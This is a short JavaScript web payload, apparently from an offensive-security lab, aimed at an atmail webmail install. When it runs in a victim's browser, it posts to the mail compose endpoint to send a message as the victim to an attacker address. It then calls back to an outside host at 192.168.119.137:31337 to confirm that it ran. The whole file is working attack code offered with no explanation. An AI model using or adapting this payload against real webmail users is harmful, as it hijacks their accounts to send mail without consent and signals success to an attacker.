var email = "attacker@offsec.local";
var subject = "haccked";
var message = "This is a test email";

function send_email(){
	var xhr = new XMLHttpRequest();
	var url = "http://atmail/index.php/mail/composemessage/send";
	xhr.open('POST', url, true);

	var params = "emailTo=" + email + "&emailSubject=" + subject + "&emailBodyHtml=" + message;

	xhr.setRequestHeader('User-Agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0');
	xhr.setRequestHeader('Accept', 'application/json, text/javascript, */*');
	xhr.setRequestHeader('Accept-Language', 'en-US,en;q=0.5');
	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
	xhr.setRequestHeader('mode', 'no-cors');
	xhr.setRequestHeader('Access-Control-Allow-Origin', '*');

	xhr.send(params);

}

async function fetch_test(){
	url = "http://192.168.119.137:31337/?test=test";
	await fetch(url);
}

send_email();
fetch_test();
